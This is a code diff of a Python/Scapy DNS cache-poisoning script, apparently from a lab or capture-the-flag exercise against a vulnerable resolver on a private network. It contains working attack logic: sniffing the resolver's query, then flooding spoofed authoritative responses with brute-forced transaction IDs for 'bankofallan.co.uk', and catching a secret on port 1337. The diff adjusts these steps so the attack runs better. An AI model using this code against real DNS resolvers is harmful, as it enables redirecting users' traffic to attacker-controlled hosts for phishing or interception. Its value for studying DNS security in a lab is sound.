@@ -44,7 +44,6 @@ class FirstThread(Thread):
                         sniffer_job()
 
                 if self.job == 1:                                                       # sender
-                        time.sleep(1)
                         sender_job()
 
                 if self.job == 2:                                                       # bad client
@@ -65,6 +64,7 @@ def sender_job():
         invio la prima query DNS per badguy.ru
         :return:
         '''
+        time.sleep(1)
         send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
         #pkt = sr1(IP(dst="192.168.56.101") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
         # p.show()
@@ -77,11 +77,10 @@ def sniffer_job():
         '''
         global Q_ID
         global PORT_NUMBER
-        #pkts = sniff(count=4, timeout=3, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", prn=lambda x: x.summary())
         #pkts = sniff(count=4, timeout=2, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", lfilter=lambda pkt: pkt.haslayer(DNS))
         filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53"
         #print filtro
-        pkts = sniff(count=4, timeout=2,
+        pkts = sniff(count=1, timeout=2,
                      filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53",
                      lfilter=lambda pkt: pkt.haslayer(DNS))
 
@@ -119,24 +118,6 @@ def flooding_job(passo):
         global Q_ID
         global PORT_NUMBER
 
-        '''
-        # build the packet
-            pkt = IP(dst=targetdns, src=targetip) / UDP(sport=53, dport=clientSrcPort) / \
-                  DNS(id=clientDNSQueryID, qr=1L, opcode='QUERY', aa=0L, tc=0L, rd=0L, ra=1L, z=0L, rcode='ok', qdcount=1, ancount=1,
-                      nscount=1, arcount=2,
-                      qd=(DNSQR(qname=clientDNSQuery, qtype='A', qclass='IN')),
-                      an=(DNSQR(qname=clientDNSQuery, qtype='A', qclass='IN')),
-                      ns=(NDSRR(rrname=domain, type='NS', rclass='IN', ttl=60000, rdlen=24, rdata=dnsspoof)),
-                      ar=(DNSRR(rrname=dnsspoof, type='A', rclass='IN', ttl=60000, rdlen=4, rdata=targetip))/
-                         DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))
-        
-            # lenght and checksum
-            pkt.getlayer(UDP).len = IP(str(pkt)).len - 20
-            pkt[UDP].post_build(str(pkt([UDP]), str(pkt[UDP].payload)))
-        
-            print('sending spoof packet')
-            send(pkt, verbose=0)
-        '''
         '''for count in range(Q_ID+1+(passo*125), Q_ID+((passo+1)*125)):
                 # mando pacchetti con il qID che varia
 
@@ -162,7 +143,7 @@ def flooding_job(passo):
 
                 # build the packet
                 pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
-                      DNS(id=count, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
+                      DNS(id=(Q_ID + 1 + passo*125 + count), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                           qdcount=1, ancount=1,
                           nscount=0, arcount=0,
                           qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
@@ -177,7 +158,9 @@ def flooding_job(passo):
 
 def secret_job():
         # pkts = sniff(count=4, timeout=3, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", prn=lambda x: x.summary())
-        scrt_pkt = sniff(count=1, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 1337")
+        #scrt_pkt = sniff(count=1, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 1337")
+        filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 1337"
+        scrt_pkt = sniff(count=1, filter= filtro)
         print "[VICTORY] got secret!"
         scrt_pkt[0].show()
 
